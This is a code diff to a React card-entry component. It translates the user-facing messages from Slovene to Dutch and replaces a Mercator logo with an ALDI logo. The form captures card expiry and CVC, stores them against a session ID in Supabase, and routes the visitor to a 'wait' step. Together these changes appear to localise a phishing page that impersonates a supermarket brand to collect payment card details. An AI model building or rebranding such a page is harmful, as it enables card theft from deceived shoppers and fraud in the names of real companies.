@@ -58,11 +58,11 @@ export function CardClient({ sessionId }: Props) {
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Vnesite veljaven datum poteka (MM/LL).");
+      setMsg("Voer een geldige vervaldatum in (MM/JJ).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Vnesite veljaven CVC/CVV (3 ali 4 števke).");
+      setMsg("Voer een geldige CVC/CVV in (3 of 4 cijfers).");
       return;
     }
     setSaving(true);
@@ -124,7 +124,7 @@ export function CardClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Shranjevanje ni uspelo.");
+    if (error) setMsg("Opslaan mislukt.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -171,8 +171,8 @@ export function CardClient({ sessionId }: Props) {
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
-            src="/form-assets/mercator-logo.png"
-            alt="Mercator logo"
+            src="/form-assets/aldi-logo.png"
+            alt="ALDI logo"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="card-ah-logo"
           />
@@ -243,7 +243,7 @@ export function CardClient({ sessionId }: Props) {
             disabled={saving || !expiryValid || !cvcValid}
             className="w-full rounded-xl bg-gradient-to-r from-[#E30613] to-[#ff4d59] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(227,6,19,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
-            {saving ? "Pošiljanje..." : settings.card_button}
+            {saving ? "Verzenden..." : settings.card_button}
           </button>
           
           <div className="mt-4 flex items-center justify-center gap-2">
